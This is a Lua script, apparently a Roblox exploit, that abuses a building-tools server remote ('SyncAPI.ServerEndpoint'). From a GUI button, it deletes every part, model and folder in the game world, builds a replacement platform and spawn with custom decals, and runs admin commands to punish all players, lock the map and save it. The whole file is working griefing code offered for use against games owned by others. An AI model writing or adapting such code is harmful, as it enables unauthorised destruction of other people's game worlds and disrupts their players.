newbutton("RealmBeta","Realm",function()
    local tool
    
    
    
    
    
    for _,v in player:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then
            tool = v.Parent
        end
    end
    remote = tool.SyncAPI.ServerEndpoint -- this part isnt mine
    
 

function resize(obj,cf,size)
    local args = {
	"SyncResize",
		{{
			Part = obj,
			CFrame = cf,
			Size = size
			}}
}
remote:InvokeServer(unpack(args))
end

function delete(obj)
  local args = {
      [1] = "Remove",
      [2] = {
          [1] = obj
      }
  }
remote:InvokeServer(unpack(args))
end

function color(part,color)
local args = {
	"SyncColor",
	{
		{
			Part = part;
			UnionColoring = true;
			Color = color
		}
	}
}
remote:InvokeServer(unpack(args))
end

function ntexture(part,face)
local args = {
	"CreateTextures",
	{
		{
			Part = part,
			Face = Enum.NormalId.Front,
			TextureType = "Decal"
		}
	}
}
remote:InvokeServer(unpack(args))
end

function rtexure(part)
local args = {
	"SyncTexture",
	{
		{
			Part = part,
			Face = Enum.NormalId.Front,
			TextureType = "Decal",
			Texture = "rbxassetid://77306121234298"
		}
	}
}
remote:InvokeServer(unpack(args))
end

function stex(part)
    local args = {
	"CreateTextures",
	{
		{
			Part = part,
			Face = Enum.NormalId.Top,
			TextureType = "Decal"
		}
	}
}
remote:InvokeServer(unpack(args))

local args = {
	"SyncTexture",
	{
		{
			Part = part,
			Face = Enum.NormalId.Top,
			TextureType = "Decal",
			Texture = "rbxassetid://5090068838"
		}
	}
}
remote:InvokeServer(unpack(args))
end


hd("punish all")
 for _, v in workspace:GetChildren() do
     if v:IsA("BasePart") or v:IsA("SpawnLocation") or v:IsA("Model") or v:IsA("Folder") then
         delete(v)
    end
 end
 
 
 
local pos = CFrame.new(0,5,0)
local basep = remote:InvokeServer("CreatePart","Normal",pos,workspace)
resize(basep, pos, vector.create(200,2,200))
color(basep, Color3.new(0,0.5,0))
local spawnn = remote:InvokeServer("CreatePart","Spawn",CFrame.new(0,6,0),workspace)
resize(spawnn,CFrame.new(0,6,0),vector.create(5,1,5))
color(spawnn,Color3.new(0,0,0))
stex(spawnn)

local rind = remote:InvokeServer("CreatePart","Normal",CFrame.new(10,10,5),workspace)
resize(rind, CFrame.new(10,10,5), vector.create(17,10,1))
color(rind,Color3.new(0,0,0))

ntexture(rind)
rtexure(rind,"77306121234298")

wait()

hd("respawn all")
hd("lockmap")
hd("savemap")

end)

